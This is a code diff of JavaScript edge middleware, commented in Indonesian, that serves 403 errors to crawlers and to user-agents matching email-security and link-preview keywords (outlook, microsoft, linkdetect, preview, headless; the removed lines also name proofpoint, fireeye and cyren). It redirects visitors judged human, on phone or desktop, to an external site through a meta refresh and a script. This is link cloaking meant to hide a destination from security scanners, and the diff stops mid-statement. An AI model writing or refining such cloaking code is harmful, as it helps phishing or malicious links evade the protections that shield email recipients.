@@ -1,39 +1,38 @@
 export default function middleware(req) {
   const ua = req.headers.get('user-agent')?.toLowerCase() || '';
   
-  // 1. FINGERPRINTING: Header yang WAJIB ada di Browser Manusia Modern
-  const hasSecChUa = req.headers.has('sec-ch-ua');           // Header Keamanan Chrome/Edge/Opera
-  const hasAcceptLang = req.headers.has('accept-language');   // Bahasa (ID, EN, dll)
-  const hasAccept = req.headers.has('accept');               // Format data yang diterima browser
+  // 1. FINGERPRINTING UNIVERSAL (Mobile & Desktop)
+  const hasAcceptLang = req.headers.has('accept-language'); 
+  const hasAccept = req.headers.get('accept')?.includes('text/html');
   
-  // 2. DAFTAR HITAM: Bot Murni & Scanner Security (Tetap aktif sebagai filter awal)
+  // Deteksi Platform: Android, iPhone, atau Desktop modern
+  const isMobile = /iphone|ipad|android/.test(ua);
+  const isDesktop = /windows|macintosh|linux/.test(ua) && !/bot|crawler|spider/.test(ua);
+
+  // 2. DAFTAR HITAM BOT (Filter Bot Scanner)
   const hardBotKeywords = [
     'bot', 'spider', 'crawler', 'scanner', 'outlook', 'office', 'microsoft',
     'linkdetect', 'bing', 'preview', 'headless', 'googleusercontent',
-    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud',
-    'internal', 'proxy', 'verification', 'cyren', 'proofpoint', 'fireeye'
+    'lighthouse', 'slurp', 'inspect', 'fetch', 'embed', 'clark', 'cloud'
   ];
 
   const isHardBot = hardBotKeywords.some(keyword => ua.includes(keyword));
 
-  // 3. LOGIKA FILTER (DETEKSI MESIN)
-  // Syarat Blokir:
-  // - Terdeteksi kata kunci bot murni
-  // - ATAU User-Agent terlalu pendek (Ciri khas script otomatis)
-  // - ATAU TIDAK punya header keamanan modern (sec-ch-ua) -> Ini cara jitu bedain User vs Bot Comcast
-  // - ATAU TIDAK punya header bahasa
-  if (isHardBot || ua.length < 50 || !hasSecChUa || !hasAcceptLang || !hasAccept) {
-    // Jika salah satu syarat di atas terpenuhi, kita anggap itu BOT
+  // 3. LOGIKA FILTER (Sangat Akurat)
+  // - Blokir jika terdeteksi bot murni
+  // - ATAU Jika User-Agent terlalu pendek (Ciri bot mentah)
+  // - ATAU Jika tidak punya header bahasa (Bot jarang punya setting bahasa)
+  // - ATAU Jika bukan Mobile DAN bukan Desktop (Berarti mesin/script asing)
+  if (isHardBot || ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
     return new Response('Error 403: Access Denied', { 
       status: 403,
       headers: { 'Content-Type': 'text/plain' }
     });
   }
 
-  // 4. JIKA LOLOS (BERARTI MANUSIA/USER ASLI)
+  // 4. JIKA LOLOS (MANUSIA ASLI - HP MAUPUN PC)
   const targetUrl = 'https://nusaindahrp.com/?dev';
   
-  // Gunakan Meta-Refresh di dalam Body sebagai lapisan redirect tambahan
   return new Response(
     `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
     {
